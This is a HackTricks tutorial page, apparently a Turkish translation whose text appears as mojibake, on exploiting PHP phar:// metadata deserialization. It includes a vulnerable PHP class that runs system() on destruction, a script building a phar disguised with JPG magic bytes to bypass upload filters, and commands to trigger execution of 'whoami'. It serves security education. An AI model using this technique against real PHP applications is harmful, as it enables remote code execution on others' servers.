# phar:// deserialization

<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

EÄŸer **hacking kariyeri** ile ilgileniyorsanÄ±z ve hacklenemez olanÄ± hacklemek istiyorsanÄ±z - **iÅŸe alÄ±yoruz!** (_akÄ±cÄ± ÅŸekilde LehÃ§e yazÄ±lÄ± ve konuÅŸma gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

**Phar** dosyalarÄ± (PHP ArÅŸivi) dosyalarÄ±, **serileÅŸtirilmiÅŸ formatta meta veri iÃ§erir**, bu nedenle ayrÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda bu **meta veri** **serileÅŸtirilir** ve **PHP** kodu iÃ§indeki bir **serileÅŸtirme** zafiyetini istismar etmeye Ã§alÄ±ÅŸabilirsiniz.

Bu Ã¶zelliÄŸin en iyi yanÄ±, bu serileÅŸtirmenin, **file\_get\_contents(), fopen(), file() veya file\_exists(), md5\_file(), filemtime() veya filesize()** gibi PHP kodunu deÄŸerlendirmeyen PHP iÅŸlevlerini kullanarak bile gerÃ§ekleÅŸmesidir.

Ã–yleyse, bir PHP web sitesinin **`phar://`** protokolÃ¼nÃ¼ kullanarak keyfi bir dosyanÄ±n boyutunu almasÄ±nÄ± saÄŸlayabileceÄŸiniz bir durumu hayal edin ve kod iÃ§inde aÅŸaÄŸÄ±daki gibi bir **sÄ±nÄ±f** bulursunuz:

{% code title="vunl.php" %}
```php
<?php
class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

filesize("phar://test.phar"); #The attacker can control this path
```
{% endcode %}

**phar** dosyasÄ± oluÅŸturabilirsiniz ve yÃ¼klendiÄŸinde aÅŸaÄŸÄ±daki gibi **bu sÄ±nÄ±fÄ± kÃ¶tÃ¼ niyetli komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanabilir**:

{% code title="create_phar.php" %}
```php
<?php

class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
{% endcode %}

**MÃ¼mkÃ¼n olan** dosya **yÃ¼klemesi** **kÄ±sÄ±tlamalarÄ±nÄ±** **atlamak** iÃ§in phar dosyasÄ±nÄ±n baÅŸÄ±na **JPG'nin sihirli baytlarÄ±** (`\xff\xd8\xff`) eklenmiÅŸtir.\
`test.phar` dosyasÄ±nÄ± **derleyin**:
```bash
php --define phar.readonly=0 create_phar.php
```
Ve zafiyetli kodu istismar ederek `whoami` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n:
```bash
php vuln.php
```
### Referanslar

{% embed url="https://blog.ripstech.com/2018/yeni-php-sÃ¶mÃ¼rÃ¼-teknigi/" %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

EÄŸer **hacking kariyeri** ile ilgileniyorsanÄ±z ve hacklenemez olanÄ± hacklemek istiyorsanÄ±z - **iÅŸe alÄ±yoruz!** (_akÄ±cÄ± polonyaca yazÄ±lÄ± ve sÃ¶zlÃ¼ dil bilgisi gereklidir_).

{% embed url="https://www.stmcyber.com/kariyer" %}

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
